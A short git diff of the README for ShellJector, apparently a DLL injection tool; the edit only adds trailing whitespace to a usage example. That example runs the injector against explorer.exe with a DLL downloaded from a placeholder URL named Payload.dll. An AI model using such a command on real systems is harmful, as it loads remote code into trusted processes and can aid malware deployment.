@@ -18,7 +18,7 @@ Also take a look at [local](https://github.com/Wolf49406/ShellJectorLocal) versi
 
 ## Arguments:
 You can set `ProcName` and `DllURL` with `-proc` and `-url` arguments  
-(ex: `ShellJector.exe -proc explorer.exe -url "https://example.com/Payload.dll"`)
+(ex: `ShellJector.exe -proc explorer.exe -url "https://example.com/Payload.dll"`)  
 Arguments are case **sensitive**!
 
 ## Notice:
